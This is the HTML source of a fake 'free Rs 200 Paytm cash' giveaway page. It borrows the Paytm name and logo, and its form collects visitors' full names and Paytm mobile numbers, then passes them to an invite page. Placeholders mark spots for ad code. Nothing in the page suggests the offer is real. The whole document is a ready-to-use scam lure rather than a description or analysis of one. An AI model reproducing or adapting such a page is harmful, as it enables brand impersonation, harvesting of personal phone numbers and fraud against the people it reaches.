

<html lang="en">


<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
 <meta property="og:locale" content="en" />
<title>Paytm Offer! You Have Won Free Rs 200 PayTm Cash</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta property="og:type" content="website" />
    <meta property="og:title" content=" Free PayTm Rs.200 Cash for Every Indian " />
    <meta property="og:url" content="index.php" />
    <meta property="og:description" content="Try it now" />
    <meta property="og:site_name" content="Free Rs.200 PayTm Cash" />
    <meta property="og:image" content="http://paytm.ProMasti.com"/>
    <link rel="shortcut icon" href="/sicon.png" type="image/x-icon">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="../www.w3schools.com/w3css/4/w3.css">
<link rel="stylesheet" type="text/css" href="style.css"/>
</head>
<body>
<div class="content">
 
    
<div class="container2">
<header>
    <div class="h_logo">
        <img src="Paytmlogo.jpg" height="auto" />
    
    <h1><b>Get Free Rs.200 PayTm Cash</b></h1>	</div>
</header>



<div class="container">
<center>

Adsence Code Here
</center>
  <form action="./invite.php" method="get">
<center>          
</center><br>
    <b>Your Full Name</b>
    <input type="text" id="name" name="" placeholder="Enter Your Full Name..." Title="Enter Your Full Name" required>

    <b>Your PayTm Number</b>
    <input type="text" id="number" name="m" placeholder="Enter Your PayTm Mobile Number..." pattern="[7-9]{1}[0-9]{9}" maxlength="10" minlength="10" Title="Please enter valid phone number" required>

    <b>Cash Amount</b>
    <select id="amount" name="amount" disabled>
      <option value="200">Rs.200</option>
     </select>



                <button class="button new btn-lg round" style="width:100%" align="center" type="submit"><i class="fa fa-hand-o-right" aria-hidden="true">&nbsp;</i><b>Send Now</b></button>
        
</form>
 <center>
 Adsence Code Here
 </center>
<br>


</div>
</div>

</div>
</body>

</html>